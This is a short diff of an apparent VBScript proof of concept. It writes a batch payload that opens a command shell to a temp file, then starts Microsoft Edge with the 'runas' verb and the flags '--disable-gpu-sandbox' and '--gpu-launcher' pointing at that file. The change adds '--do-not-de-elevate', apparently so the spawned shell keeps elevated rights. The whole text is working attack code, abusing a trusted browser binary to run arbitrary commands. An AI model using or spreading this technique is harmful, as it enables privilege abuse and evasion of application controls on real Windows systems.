@@ -8,4 +8,4 @@ Payload = "echo :) && cmd"
 Set File = FSO.CreateTextFile(Temp, true)
 File.WriteLine(Payload)
 
-App.ShellExecute "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", "--disable-gpu-sandbox --gpu-launcher=" + Temp, , "runas"
+App.ShellExecute "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", "--disable-gpu-sandbox --do-not-de-elevate --gpu-launcher=" + Temp, , "runas"
